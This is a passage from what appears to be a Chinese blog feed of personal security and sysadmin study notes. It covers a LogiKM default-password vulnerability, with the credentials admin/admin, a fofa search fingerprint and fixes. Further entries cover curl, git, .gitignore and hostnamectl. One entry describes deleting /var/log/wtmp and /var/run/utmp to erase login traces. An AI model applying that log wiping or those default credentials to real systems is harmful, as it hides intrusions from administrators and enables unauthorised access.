    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>LogiKM 是滴滴开源的Kafka管理平台，也称为 KnowStreaming</p><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><p>默认端口：80</p><p>默认密码：admin&#x2F;admin</p><p>服务指纹：title 包含 LogiKM</p><h2 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h2><h3 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h3><p>LogiKM默认口令</p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>LogiKM服务使用默认口令</p><h3 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h3><p>高危</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1、禁止将LogiKM服务暴露在公网</p><p>2、设置强口令，包含数字、大小写字母、特殊字符，长度10位以上</p><p>3、设置访问来源IP限制</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a>默认信息</h4><p>默认端口 8080（TCP）</p><h4 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h4><p>title：LogiKM</p><h4 id="服务查询"><a href="#服务查询" class="headerlink" title="服务查询"></a>服务查询</h4><h5 id="fofa-info"><a href="#fofa-info" class="headerlink" title="fofa.info"></a>fofa.info</h5><p>“title: LogiKM”</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] name user time<br>链接：link</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/03/15/security/secresponse/attack_hidden/"/>
    <url>/2024/03/15/security/secresponse/attack_hidden/</url>
    
    <content type="html"><![CDATA[<p>登录信息清除</p><p>删除或清空 &#x2F;var&#x2F;run&#x2F;utmp &#x2F;var&#x2F;log&#x2F;wtmp ，删除后不会产生新的文件</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>curl_base</title>
    <link href="/2024/03/15/yunwei/applications/curl/curl_base/"/>
    <url>/2024/03/15/yunwei/applications/curl/curl_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>curl 是一个免费的开源工具，用于从或向服务器传输数据。它支持多种操作系统，如 Windows、Ubuntu、RHEL、CentOS、Fedora 和 OpenSUSE。</p><h2 id="功能提供"><a href="#功能提供" class="headerlink" title="功能提供"></a>功能提供</h2><p>curl 所有的传输功能均为 libcurl 库提供</p><h2 id="语法参数"><a href="#语法参数" class="headerlink" title="语法参数"></a>语法参数</h2><h3 id="–insecure"><a href="#–insecure" class="headerlink" title="–insecure"></a>–insecure</h3><p>忽略HTTPS证书校验</p><h3 id="v"><a href="#v" class="headerlink" title="-v"></a>-v</h3><p>显示完整通信过程，端口连接，request请求</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gams">root@iZbp1191gh7vw52537lyxrZ:~# curl https:<span class="hljs-comment">//10000hours.github.io -v</span><br><span class="hljs-comment">*   Trying 185.199.108.153:443...</span><br><span class="hljs-comment">*   Trying 2606:50c0:8000::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8000::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8003::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8003::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8002::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8002::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8001::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8001::153: Network is unreachable</span><br><span class="hljs-comment">* Connected to 10000hours.github.io (185.199.108.153) port 443 (#0)</span><br><span class="hljs-comment">* ALPN, offering h2</span><br><span class="hljs-comment">* ALPN, offering http/1.1</span><br><span class="hljs-comment">*  CAfile: /etc/ssl/certs/ca-certificates.crt</span><br><span class="hljs-comment">*  CApath: /etc/ssl/certs</span><br><span class="hljs-comment">* TLSv1.0 (OUT), TLS header, Certificate Status (22):</span><br><span class="hljs-comment">* TLSv1.3 (OUT), TLS handshake, Client hello (1):</span><br><span class="hljs-comment">* TLSv1.2 (IN), TLS header, Certificate Status (22):</span><br></code></pre></td></tr></table></figure><h3 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h3><p>设置请求header</p><p>-H “X-Stream-Protocol-Version: <a href="http://v2.channel.k8s.io/">v2.channel.k8s.io</a>“</p><h3 id="X"><a href="#X" class="headerlink" title="-X"></a>-X</h3><p>指定协议，默认GET</p><p>-X POST</p><h3 id="d"><a href="#d" class="headerlink" title="-d"></a>-d</h3><p>指定参数 -d ‘key&#x3D;value’，多个参数，多个-d</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -d <span class="hljs-string">&quot;name=curl&quot;</span> https:<span class="hljs-comment">//example.com</span><br>curl -d <span class="hljs-string">&quot;name=curl&quot;</span> -d <span class="hljs-string">&quot;tool=cmdline&quot;</span> https:<span class="hljs-comment">//example.com</span><br></code></pre></td></tr></table></figure><h3 id="G"><a href="#G" class="headerlink" title="-G"></a>-G</h3><p>指定发送GET请求</p><h3 id="k"><a href="#k" class="headerlink" title="-k"></a>-k</h3><p>忽略HTTPS证书校验</p><h3 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h3><p>静默模式，不输出任何信息</p><h3 id="S"><a href="#S" class="headerlink" title="-S"></a>-S</h3><p>显示错误信息</p><h3 id="L"><a href="#L" class="headerlink" title="-L"></a>-L</h3><p>跟随重定向</p><h3 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h3><p>设置referer</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -e <span class="hljs-string">&quot;https://example.com&quot;</span> http:<span class="hljs-comment">//www.example.com</span><br></code></pre></td></tr></table></figure><h2 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h2><h3 id="DICT"><a href="#DICT" class="headerlink" title="DICT"></a>DICT</h3><p>Lets you lookup words using online dictionaries.</p><p>允许您使用在线词典查找单词。</p><h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><p>Read or write local files. curl does not support accessing file:&#x2F;&#x2F; URL remotely, but when running on Microsoft Windows using the native UNC approach will work.</p><p>读取或写入本地文件。curl不支持远程访问file:&#x2F;&#x2F; URL，但在Microsoft Windows上运行时，使用本机UNC方法可以工作。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># curl file:///root/1.txt</span><br><span class="hljs-number">111111</span><br></code></pre></td></tr></table></figure><h3 id="FTP-FTPS"><a href="#FTP-FTPS" class="headerlink" title="FTP FTPS"></a>FTP FTPS</h3><p>curl supports the File Transfer Protocol with a lot of tweaks and levers. With or without using TLS.</p><p>curl支持使用文件传输协议，并具有许多调整和杠杆作用。无论是否使用TLS，都可以使用它。</p><h4 id="从FTP服务器下载文件"><a href="#从FTP服务器下载文件" class="headerlink" title="从FTP服务器下载文件"></a>从FTP服务器下载文件</h4><p>curl <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;download&#x2F;file.txt -o local_file.txt</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">➜  /tmp curl <span class="hljs-symbol">ftp:</span>//<span class="hljs-symbol">hot:</span><span class="hljs-number">123456</span><span class="hljs-variable">@10</span>.<span class="hljs-number">2.2</span>.<span class="hljs-number">2</span>/hotcal.tar.gz -o local_file.txt<br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span> <span class="hljs-number">95172</span>  <span class="hljs-number">100</span> <span class="hljs-number">95172</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">484</span>k      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  <span class="hljs-number">491</span>k<br><br>➜  /tmp ls -la local_file.txt<br>-rw-r--r--  <span class="hljs-number">1</span> admin  wheel  <span class="hljs-number">95172</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">17</span><span class="hljs-symbol">:</span><span class="hljs-number">43</span> local_file.txt<br></code></pre></td></tr></table></figure><h4 id="上传文件到FTP服务器"><a href="#上传文件到FTP服务器" class="headerlink" title="上传文件到FTP服务器"></a>上传文件到FTP服务器</h4><p>curl -T “file.txt” <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;upload&#x2F;</p><h4 id="被动模式进行FTP传输"><a href="#被动模式进行FTP传输" class="headerlink" title="被动模式进行FTP传输"></a>被动模式进行FTP传输</h4><p>被动模式用于解决某些情况下，主动模式失败的情况</p><p>curl -e “<a href="ftp://ftp.example.com/">ftp://ftp.example.com</a>“ <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;download&#x2F;file.txt -o local_file.txt</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">➜  /tmp curl -e <span class="hljs-string">&quot;ftp://10.2.2.2&quot;</span> <span class="hljs-symbol">ftp:</span>//<span class="hljs-symbol">hot:</span><span class="hljs-number">123456</span><span class="hljs-variable">@10</span>.<span class="hljs-number">2.2</span>.<span class="hljs-number">2</span>/hotcal.tar.gz -o local_file.txt <br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span> <span class="hljs-number">95172</span>  <span class="hljs-number">100</span> <span class="hljs-number">95172</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">518</span>k      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  <span class="hljs-number">537</span>k<br>➜  /tmp <br>➜  /tmp ls -lat local_file.txt <br>-rw-r--r--  <span class="hljs-number">1</span> admin  wheel  <span class="hljs-number">95172</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">19</span><span class="hljs-symbol">:</span><span class="hljs-number">21</span> local_file.txt<br></code></pre></td></tr></table></figure><h3 id="GOPHER-GOPHERS"><a href="#GOPHER-GOPHERS" class="headerlink" title="GOPHER GOPHERS"></a>GOPHER GOPHERS</h3><p>Retrieve files.</p><p>检索文件</p><h3 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP HTTPS"></a>HTTP HTTPS</h3><p>curl supports HTTP with numerous options and variations. It can speak HTTP version 0.9, 1.0, 1.1, 2 and 3 depending on build options and the correct command line options.</p><p>curl通过许多选项和变体支持HTTP。它可以使用HTTP版本0.9、1.0、1.1、2和3，具体取决于构建选项和正确的命令行选项。</p><h3 id="IMAP-IMAPS"><a href="#IMAP-IMAPS" class="headerlink" title="IMAP IMAPS"></a>IMAP IMAPS</h3><p>Using the mail reading protocol, curl can “download” emails for you. With or without using TLS.</p><p>使用邮件读取协议，curl可以为您“下载”电子邮件。使用或不使用TLS。</p><h3 id="LDAP-LDAPS-MQTT-POP3-POP3S-RTMP-RTMPS-RTSP-SCP-SFTP-SMB-SMBS-SMTP-SMTPS-TELNET-or-TFTP"><a href="#LDAP-LDAPS-MQTT-POP3-POP3S-RTMP-RTMPS-RTSP-SCP-SFTP-SMB-SMBS-SMTP-SMTPS-TELNET-or-TFTP" class="headerlink" title="LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP"></a>LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP</h3><h2 id="官方链接"><a href="#官方链接" class="headerlink" title="官方链接"></a>官方链接</h2><p><a href="https://curl.se/libcurl/">https://curl.se/libcurl/</a></p><p><a href="https://github.com/curl/curl">https://github.com/curl/curl</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_base</title>
    <link href="/2024/03/15/yunwei/applications/git/git_base/"/>
    <url>/2024/03/15/yunwei/applications/git/git_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</p><p>Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</p><p>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p><h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><h2 id="git-config"><a href="#git-config" class="headerlink" title="git config"></a>git config</h2><h3 id="git-config-l"><a href="#git-config-l" class="headerlink" title="git config -l"></a>git config -l</h3><p>返回所有配置信息</p><p>返回值为key&#x3D;value格式</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">[root@localhost software]<span class="hljs-comment"># git config --global -l</span><br>http.https:<span class="hljs-regexp">//gi</span>thub.com.proxy=socks5:<span class="hljs-regexp">//</span><span class="hljs-number">10.222</span>.<span class="hljs-number">28.7</span>:<span class="hljs-number">1081</span><br></code></pre></td></tr></table></figure><h3 id="git-config-get-keyname"><a href="#git-config-get-keyname" class="headerlink" title="git config get keyname"></a>git config get keyname</h3><p>返回指定key的value</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">[root<span class="hljs-meta">@localhost</span> software]# git config --global --<span class="hljs-keyword">get</span> http.https:<span class="hljs-comment">//github.com.proxy</span><br>socks5:<span class="hljs-comment">//10.222.28.7:1081</span><br></code></pre></td></tr></table></figure><h3 id="git-config-–global-–unset-keyname"><a href="#git-config-–global-–unset-keyname" class="headerlink" title="git config –global –unset keyname"></a>git config –global –unset keyname</h3><p>取消指定key的配置</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp">[root@localhost software]<span class="hljs-meta"># git config --<span class="hljs-keyword">global</span> --unset http.https:<span class="hljs-comment">//github.com.proxy</span></span><br>[root@localhost software]<span class="hljs-meta"># git config --<span class="hljs-keyword">global</span> --get http.https:<span class="hljs-comment">//github.com.proxy</span></span><br></code></pre></td></tr></table></figure><h2 id="清除本地缓存"><a href="#清除本地缓存" class="headerlink" title="清除本地缓存"></a>清除本地缓存</h2><p><strong>git rm -r –cached .</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  studynote git:(main) ✗ git <span class="hljs-built_in">rm</span> -r --cached .<br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;.gitignore&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;README.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangBase.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangError.md&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_base</title>
    <link href="/2024/03/15/yunwei/applications/git/git_error/"/>
    <url>/2024/03/15/yunwei/applications/git/git_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对日常使用git过程中遇到的问题及解决方案记录总结</p><h2 id="CentOS-无法-git-clone"><a href="#CentOS-无法-git-clone" class="headerlink" title="CentOS 无法 git clone"></a>CentOS 无法 git clone</h2><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1、设置socket5代理</p><p>git config –global http.<a href="https://github.com.proxy/">https://github.com.proxy</a> socks5:&#x2F;&#x2F;10.222.28.7:1081</p><p>2、取消代理</p><p>git config –global –unset http.proxy git config –global –unset https.proxy</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] 设置代理解决github被墙 TjFish 2022-03-15 21:57</p><p>链接：<a href="https://zhuanlan.zhihu.com/p/481574024">https://zhuanlan.zhihu.com/p/481574024</a></p><h2 id="上传文件过大"><a href="#上传文件过大" class="headerlink" title="上传文件过大"></a>上传文件过大</h2><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a><strong>报错信息</strong></h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">➜  studynote git:(main) git push <br>枚举对象中: <span class="hljs-number">834</span>, 完成.<br>对象计数中: <span class="hljs-number">100</span>% (<span class="hljs-number">834</span>/<span class="hljs-number">834</span>), 完成.<br>使用 <span class="hljs-number">8</span> 个线程进行压缩<br>压缩对象中: <span class="hljs-number">100</span>% (<span class="hljs-number">829</span>/<span class="hljs-number">829</span>), 完成.<br>写入对象中: <span class="hljs-number">100</span>% (<span class="hljs-number">831</span>/<span class="hljs-number">831</span>), <span class="hljs-number">467.85</span> MiB | <span class="hljs-number">1.09</span> MiB/s, 完成.<br>总共 <span class="hljs-number">831</span>（差异 <span class="hljs-number">13</span>），复用 <span class="hljs-number">0</span>（差异 <span class="hljs-number">0</span>），包复用 <span class="hljs-number">0</span><br>remote: Resolving deltas: <span class="hljs-number">100</span>% (<span class="hljs-number">13</span>/<span class="hljs-number">13</span>), done.<br>remote: <span class="hljs-literal">error</span>: Trace: b0be7add97db98c12a70ff80495a417f07375427385a833f1e5978a2830b3fb7<br>remote: <span class="hljs-literal">error</span>: See https://gh.io/lfs <span class="hljs-keyword">for</span> more information.<br>remote: <span class="hljs-literal">error</span>: <span class="hljs-keyword">File</span> security/secResources/PPT/FireShot Capture <span class="hljs-number">001</span> - 华为Anti-DDoS方案技术白皮书-V600R21C10 - 华为企业业务 - e.huawei.com.pdf <span class="hljs-keyword">is</span> <span class="hljs-number">309.68</span> MB; this exceeds GitHub<span class="hljs-symbol">&#x27;s</span> <span class="hljs-keyword">file</span> size limit <span class="hljs-keyword">of</span> <span class="hljs-number">100.00</span> MB<br>remote: <span class="hljs-literal">error</span>: GH001: Large files detected. You may want <span class="hljs-keyword">to</span> try Git Large <span class="hljs-keyword">File</span> Storage - https://git-lfs.github.com.<br><span class="hljs-keyword">To</span> ncgithub.com:C0isini/studynote.git<br> ! [remote rejected] main -&gt; main (pre-receive hook declined)<br>错误：无法推送一些引用到 <span class="hljs-symbol">&#x27;ncgithub</span>.com:C0isini/studynote.git&#x27;<br></code></pre></td></tr></table></figure><p>清除本地缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  studynote git:(main) ✗ git <span class="hljs-built_in">rm</span> -r --cached .<br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;.gitignore&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;README.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangBase.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangError.md&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_sec</title>
    <link href="/2024/03/15/yunwei/applications/git/git_sec/"/>
    <url>/2024/03/15/yunwei/applications/git/git_sec/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github 为了安全性需要禁止上传敏感内容，所以需要 .gitignore 文件来设置哪些文件不需要上传进行版本管理</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/dir/</span> 过滤整个文件夹<br>*<span class="hljs-string">.txt</span> 过滤所有<span class="hljs-string">.txt</span>文件<br><span class="hljs-string">/dir/config.php</span> 过滤具体文件<br></code></pre></td></tr></table></figure><p>说明：</p><p>过滤掉的文件不会上传，也就是说不会进行版本管理，本地还是会有的</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">/ 开头表示目录<br>* 通配多个字符<br>? 通配单个字符<br><span class="hljs-string">[]</span> 包含单个字符的匹配列表<br>! 表示不忽略匹配的文件或者目录，也就是会上传<br></code></pre></td></tr></table></figure><p>规则匹配策略：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">自上到下进行匹配<br></code></pre></td></tr></table></figure><h2 id="错误总结"><a href="#错误总结" class="headerlink" title="错误总结"></a>错误总结</h2><p>1、不生效原因</p><p>可能是已经在缓存中，清除缓存，重新上传</p><p>git rm -r –cached .</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hostnamectl</title>
    <link href="/2024/03/15/yunwei/commands/hostnamectl/"/>
    <url>/2024/03/15/yunwei/commands/hostnamectl/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h1><p>控制系统主机名</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>CPE OS <span class="hljs-attribute">Name</span>: <span class="hljs-attribute">cpe</span>: /<span class="hljs-attribute">o</span>:<span class="hljs-attribute">almalinux</span>:<span class="hljs-attribute">almalinux</span>:<span class="hljs-number">9</span>::baseos<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><p>Static hostname  静态主机名</p><p>Icon name 图标名</p><p>Chassis 主机类型</p><p>Machine ID 主机ID</p><p>Boot ID</p><p>Virtualization: kvm 虚拟化，可以用来标记是否是虚拟机，物理机不存在该数据</p><p>Operating System：Ubuntu 22.04.2 LTS 操作系统信息</p><p>CPE OS Name:  cpe: &#x2F;o:almalinux:almalinux:9::baseos </p><p>Kernel: Linux 5.15.0-73-generic 内核信息</p><p>Architecture: x86-64 架构信息（x86-64）</p><p>Hardware Vendor: Alibaba Cloud  硬件供应商</p><p>Hardware Model: Alibaba Cloud ECS 硬件型号</p><p>Firmware Version: xxxzz-U08 固件版本</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>hostnamectl [OPTIONS…] {COMMAND}</p><h3 id="主机名类型"><a href="#主机名类型" class="headerlink" title="主机名类型"></a>主机名类型</h3><h4 id="pretty-主机名"><a href="#pretty-主机名" class="headerlink" title="pretty 主机名"></a>pretty 主机名</h4><p>易读的主机名称，对字符几乎没有限制（可以使用特殊字符# @ 等）</p><p>存储在 &#x2F;etc&#x2F;machine-info，从 machine-info 命令中可查看更多信息</p><p>默认设备是没有该名称的，使用 hostnamectl –pretty 查询结果为空，&#x2F;etc&#x2F;machine-info 文件也是不存在的，如果使用 hostnamectl set-hostname 设置后，文件和查询都会存在</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># ls -lat /etc/machine-info</span><br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 28 </span>Jan<span class="hljs-number"> 30 </span>15:20 /etc/machine-info<br></code></pre></td></tr></table></figure><h4 id="static-主机名（常说的主机名）"><a href="#static-主机名（常说的主机名）" class="headerlink" title="static 主机名（常说的主机名）"></a>static 